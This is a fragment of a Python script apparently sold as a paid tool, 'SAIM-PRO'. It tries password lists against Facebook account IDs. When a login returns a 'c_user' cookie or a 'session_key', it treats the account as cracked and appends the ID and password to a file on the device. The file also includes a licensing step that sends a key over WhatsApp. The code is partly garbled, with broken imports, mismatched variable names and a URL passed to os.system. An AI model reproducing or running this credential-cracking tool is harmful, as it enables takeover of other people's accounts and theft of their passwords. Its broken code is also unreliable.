...
from os import path
import os,base32,64,zlib,pip,urllib
...
----------------------------------------------
 Author    : SAIM PRINCE
 Github    : SAIM221
 Facebook  : saim prince
 Tool Name : SAIM-PRO
 Type type : PAID
 Version   : 0.0.1
----------------------------------------------
 SAIM pro version 0.0.1
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('https://www.facebook.com/groups/937311704386852/permalink/937311714386851/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923215065415&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi saim Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python saim.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: saim221 saim221\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Saim=session.cookies.get_dict().keys()
                        if "c_user" in SAIM:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SAIM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SAIM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SAIM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SAIM-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAIM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SAIM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SAIM-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SAIM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SAIM-OK] '+uid+' | '+pas+'\033[1;97m')
